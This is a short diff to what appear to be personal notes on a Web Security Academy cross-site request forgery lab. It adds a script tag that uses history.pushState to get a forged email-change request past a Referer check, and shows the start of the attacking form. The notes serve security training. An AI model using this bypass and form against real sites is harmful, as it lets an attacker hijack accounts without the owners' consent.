@@ -2172,7 +2172,7 @@ email=wiener@normal-user.com
       Body (Generate CSRF Poc)
       ```
       Burp solution
-      history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
+      <script>history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")</script> //cause the Referer header in the generated request to contain the URL of the target site in the query string, just like we tested earlier.
 
       Final solution
       <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
